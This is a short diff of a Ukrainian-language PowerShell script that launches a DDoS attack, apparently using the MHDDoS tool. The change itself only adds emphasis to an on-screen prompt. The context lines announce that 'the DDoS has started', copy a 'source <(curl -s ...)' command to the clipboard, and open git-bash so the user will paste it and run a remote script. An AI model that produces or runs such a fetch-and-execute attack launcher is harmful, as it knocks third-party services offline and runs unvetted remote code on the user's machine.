@@ -87,7 +87,7 @@ if ($key -eq "Y" -or $key -eq "Enter") {
     Write-Output "По завершенню роботи виключити комп*ютер ` [Enter], [Y] - Так" ; $keys = [Console]::ReadKey($true).Key
     if ($keys -eq "Y" -or $keys -eq "Enter") {$Shutdown = $true} else {$Shutdown = $false}
 }
-Clear-Host ; Write-Output "В новому вікні вставте й запустіть команду [ПКМ] і [Enter]" ; Start-Sleep -s 5 ; Clear-Host
+Clear-Host ; Write-Output "!!!!---- В новому вікні вставте й запустіть команду [ПКМ] і [Enter] ----!!!!" ; Start-Sleep -s 5 ; Clear-Host
 Write-Output "--------------- Дудос почався [СЛАВА УКРАЇНІ] [ГЕРОЯМ СЛАВА] ---------------"
 Set-Clipboard -Value "source <(curl -s $mhddos_bash_clipboard)"
 Start-Process -filepath "$env:programfiles\Git\git-bash.exe"
